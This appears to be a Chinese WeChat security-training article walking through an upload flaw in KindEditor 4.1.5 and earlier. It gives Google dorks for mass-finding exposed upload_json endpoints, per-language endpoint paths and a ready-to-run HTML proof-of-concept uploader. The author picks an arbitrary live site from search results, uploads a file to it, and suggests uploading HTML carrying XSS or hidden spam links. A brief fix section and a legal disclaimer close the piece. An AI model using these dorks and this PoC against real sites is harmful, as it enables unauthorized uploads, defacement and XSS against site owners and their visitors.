#  漏洞挖掘 | 编辑器漏洞之kindeditor   
原创 zkaq-master666  掌控安全EDU   2024-02-13 12:00  
  
扫码领资料  
  
获网安教程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
本文由掌控安全学院 - master666 投稿  
  
今天呢给大家复现一个kindeditor<=4.1.5上传漏洞。小弟能力有限，还在坚持学习的路上，还请大佬多多指教。自我感觉编辑器漏洞很容易忽视。此文章作为记录本人学习的开始，丰富自己的阅历。我们共同进步。  
## 0x00 漏洞描述  
  
一定要注意是版本小于4.1.5。可能现在同学会问我怎么看版本，后边我悄悄告诉你。漏洞主要是存在于kindeditor编辑器里。通过编辑器你能上传.txt和.html文件。并且此漏洞的优势在于使用语言广泛，支持php/asp/jsp/asp.net。  
  
这里html里面可以嵌套暗链接地址以及嵌套xss。Kindeditor上的uploadbutton.html用于文件上传功能页面，直接POST到/upload_json.*?dir=file，在允许上传的文件扩展名中包含htm,txt：extTable.Add(“file”,”doc,docx,xls,xlsx,ppt,htm,html,txt,zip,rar,gz,bz2”)  
  
简单理解：就是可以通过poc间接性的上传文件。uploadbutton.html直接指向/upload_json.*?dir=file不懂没关系，后边看我实战就ok了。  
## 0x01 批量搜索  
  
找漏洞最必要的还是批量，别人借助工具，咱们借助谷歌。批量可以节省你大部分的时间。那么此时的你一定在关心谷歌语法吧。下边给大家列举一下。  
```
inurl:/examples/uploadbutton.html
inurl:/php/upload_json.php
inurl:/asp.net/upload_json.ashx
inurl://jsp/upload_json.jsp
inurl://asp/upload_json.asp

```  
  
我们以其中一条为例进行谷歌搜索一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcplYiblyiaG57ia8RibnNHON79JR4ibUJxrDjWicyx1094rpGqe4K1xqj3gv7ez4URPtX0nR1CdMaldmmuw/640?wx_fmt=png&from=appmsg "")  
  
看吧，这是以其中一条语法搜索的啊这些所有的链接都尝试一遍，找出的漏洞积分在漏洞盒子上不了榜？我信你个鬼。好了，开个玩笑，我说到这，剩下的交给你们。  
## 0x02 漏洞条件  
  
要想挖掘漏洞一定要有一个可以产生漏洞的条件。这个大家都可以理解，那kindeditor编辑器的漏洞需要什么条件呢。  
  
1.首先一定要看脚本语言，对症下药。kindeditor编辑器支持php/asp/jsp/asp.net，payload给你们放下边。  
```
/asp/upload_json.asp
/asp.net/upload_json.ashx
/jsp/upload_json.jsp
/php/upload_json.php

```  
  
检查的目的就是验证文件 upload_json.* 存在不存在（漏洞描述中有讲过为什么）  
  
2.查看可目录变量是否存在那种脚本上传漏洞，这个不懂没关系，看我后边操作。这里同样给你们检测的payload。  
```
kindeditor/asp/upload_json.asp?dir=file
kindeditor/asp.net/upload_json.ashx?dir=file
kindeditor/jsp/upload_json.jsp?dir=file
kindeditor/php/upload_json.php?dir=file

```  
  
根据web容器选择合适的payload。  
## 0x03 漏洞复现  
  
1.Google hacking搜索漏洞点。以其中一条语法为例![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BwqHlJ29vcplYiblyiaG57ia8RibnNHON79Ju3lTcMeu2TLdEjFIxfFLsnhZLytw9mzSMObH8IbQxGoblv39MXw3tQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
2.这么多网站随便点一个呗。![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BwqHlJ29vcplYiblyiaG57ia8RibnNHON79JlJZYuEW4buS0esrkpbRBNBkIiadu0aD0UicqmqY2UNInhXHgkR6fibF4g/640?wx_fmt=jpeg&from=appmsg "")  
点进去之后发现是上传点，大概你第一眼想到的就是文件上传漏洞，当然这里存不存在我没试过，你可以尝试一下。  
  
3.悄悄的告诉你如何查看版本。  
```
http://www.xxx.com/kindeditor/kindeditor.js

```  
  
对，就这！不信你看图。![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BwqHlJ29vcplYiblyiaG57ia8RibnNHON79J2yu70u7qhsdnI2RQU8CF0NbkSIgIfO4aN7bWs9vVXdibxa19alxMVRw/640?wx_fmt=jpeg&from=appmsg "")  
很显然，4.1.4版本，在我们的掌控中。  
  
4.验证文件 upload_json.* 是否存在（上边方法有列举）这里呢可以通过分析网站结构来查看脚本语言，我这里用的插件![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BwqHlJ29vcplYiblyiaG57ia8RibnNHON79JESicN1BNKVWaQZOA3U52PeBflPXuOSEjcKz7w9bwgAXP5euAeORhrJw/640?wx_fmt=jpeg&from=appmsg "")  
可以看到web服务器是IIS，那就猜想asp的站嘛，当然如果你不想分析，一共4条你挨个试一下嘛，访问一下看看![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BwqHlJ29vcplYiblyiaG57ia8RibnNHON79JBFicPYlOIl6wTBKT3a3KDiaufq11QT6fWRtpViboBCvRP8q3ibqlynaibGw/640?wx_fmt=jpeg&from=appmsg "")  
很明显，存在。  
  
5.今天的武器就是前辈创造的poc。这里需要修改<script>…<script>以及url : 的内容,根据实际情况修改.  
```
<html><head>
<title>Uploader</title>
<script src="http://www.xxx.com/kindeditor//kindeditor.js"></script>
<script>
KindEditor.ready(function(K) {
var uploadbutton = K.uploadbutton({
button : K('#uploadButton')[0],
fieldName : 'imgFile',
url : 'http://www.xxx.com/kindeditor/jsp/upload_json.jsp?dir=file',
afterUpload : function(data) {
if (data.error === 0) {
var url = K.formatUrl(data.url, 'absolute');
K('#url').val(url);}
},
});
uploadbutton.fileBox.change(function(e) {
uploadbutton.submit();
});
});
</script></head><body>
<div class="upload">
<input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />
<input type="button" id="uploadButton" value="Upload" />
</div>
</body>
</html>

```  
  
6.做一个html，用浏览器打开看一下。![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BwqHlJ29vcplYiblyiaG57ia8RibnNHON79JwdpMiaSQPunliapicgn1IKw5ZaW28HD7lj6l2JBo6E7iaPicKJ7pT5YDcuA/640?wx_fmt=jpeg&from=appmsg "")  
7.这里呢要配合一下抓包，需要看一下返回地址。我上传一个txt文件，看一下![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BwqHlJ29vcplYiblyiaG57ia8RibnNHON79JK6LXf2mncdyBhsXUyfYTmKBadQUHyQgxUutWtk9XxGMZjNaibCqFYCg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
8.我们访问一下文件看看。![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/BwqHlJ29vcplYiblyiaG57ia8RibnNHON79J6MCJYjJApiazUHBSGOlf26giaict99zghOklEkkWBFkDibsNOB5evOkrpw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
成功了。当然这了可以传很多格式，上边有介绍。比如这里传一个html里面可以嵌套暗链接地址以及嵌套xss。  
## 0x04 漏洞修复  
  
1.直接删除upload_json.和file_manager_json.  
  
2.升级kindeditor到最新版本  
## 0x05 总结  
  
可能手法比较老，毕竟也不能否定他的存在。渗透测试的核心讲究测试嘛。希望这篇文章对一直探索的我们有所帮助。  
  
申  
明  
：  
本  
公  
众  
号  
所  
分  
享  
内  
容  
仅  
用  
于  
网  
络  
安  
全  
技  
术  
讨  
论  
，  
切  
勿  
用  
于  
违  
法  
途  
径  
，  
  
所  
有  
渗  
透  
都  
需  
获  
取  
授  
权  
，  
违  
者  
后  
果  
自  
行  
承  
担  
，  
与  
本  
号  
及  
作  
者  
无  
关  
，  
请  
谨  
记  
守  
法  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
**没看够~？欢迎关注！**  
  
  
  
**分享本文到朋友圈，可以凭截图找老师领取**  
  
上千**教程+工具+靶场账号**哦  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrpvQG1VKMy1AQ1oVvUSeZYhLRYCeiaa3KSFkibg5xRjLlkwfIe7loMVfGuINInDQTVa4BibicW0iaTsKw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
******分享后扫码加我！**  
  
  
**回顾往期内容**  
  
[Xray挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  
  
  
[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)  
  
  
[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  
  
  
[文库｜内网神器cs4.0使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  
  
  
[代码审计 | 这个CNVD证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)  
  
  
[【精选】SRC快速入门+上分小秘籍+实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)  
  
##     代理池工具撰写 | 只有无尽的跳转，没有封禁的IP！  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1 "")  
  
点赞+在看支持一下吧~感谢看官老爷~   
  
你的点赞是我更新的动力  
  
  
